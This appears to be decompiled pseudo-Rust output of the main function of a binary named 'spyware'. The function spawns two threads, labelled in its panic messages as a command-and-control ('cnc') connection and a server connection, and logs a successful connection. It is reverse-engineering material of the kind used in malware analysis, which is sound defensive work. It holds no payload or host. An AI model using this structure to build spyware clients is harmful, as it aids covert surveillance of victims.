
  fn spyware::main::h0c167b4c5fedcce2() -> i64

{
    spyware::init_logging::h71d90daabdd6a317();
    let mut var_d8: i128;
    let mut var_70: *const i8;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3
    {
        var_d8 = &data_4b9430;
        *var_d8[8] = 1;
        let var_c8_1: i64 = 8;
        let mut var_c0: i64;
        var_c0 = {0};
        let rax_1: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9440);
        var_70 = "spyware:Successfully connected t…";
        let var_68_1: i64 = 7;
        let var_60_1: *const i8 = "spyware:Successfully connected t…";
        let var_58_1: i64 = 7;
        let var_50_1: i64 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_d8, 3, &var_70);
    }
    
    let var_90: i64 = -0x8000000000000000;
    let mut var_a0: i64 = 0;
    let var_78: i8 = 0;
    let var_80: i64;
    let var_b8: i64 = var_80;
    let var_b0: i8 = 0;
    let var_77: i32;
    let var_af: i32 = var_77;
    let var_73: i16;
    let var_ab: i16 = var_73;
    let var_71: i8;
    let var_a9: i8 = var_71;
    let mut var_c8_2: i64 = var_90;
    let var_88: i64;
    let var_c0_1: i64 = var_88;
    var_d8 = var_a0;
    std::thread::Builder::spawn_unchecked::hebf060dfae3bacc5(&var_70, &var_d8);
    let mut var_48: i128;
    core::result::Result$LT$T$C$E$GT$::expect::h0214701cb0e2f56b(&var_48, &var_70);
    std::thread::Builder::spawn_unchecked::h346b3a5527f731fa(&var_d8, &var_a0);
    let mut var_28: i128;
    core::result::Result$LT$T$C$E$GT$::expect::h0214701cb0e2f56b(&var_28, &var_d8);
    let var_18: i128;
    var_c8_2 = var_18;
    var_d8 = var_28;
    let mut rax_8: i64;
    let mut rdx_2: i64;
    rax_8 = std::thread::JoinInner$LT$T$GT$::join::hba541073fdcb0e40(&var_d8);
    core::result::Result$LT$T$C$E$GT$::expect::h4bc56609d4fa5fe6(rax_8, rdx_2, 
        "The cnc connection has panicked.…", 0x20);
    let var_38: i128;
    var_c8_2 = var_38;
    var_d8 = var_48;
    let mut result: i64;
    let mut rdx_3: i64;
    result = std::thread::JoinInner$LT$T$GT$::join::hba541073fdcb0e40(&var_d8);
    core::result::Result$LT$T$C$E$GT$::expect::h4bc56609d4fa5fe6(result, rdx_3, 
        "The server connection has panick…", 0x23);
    result
}
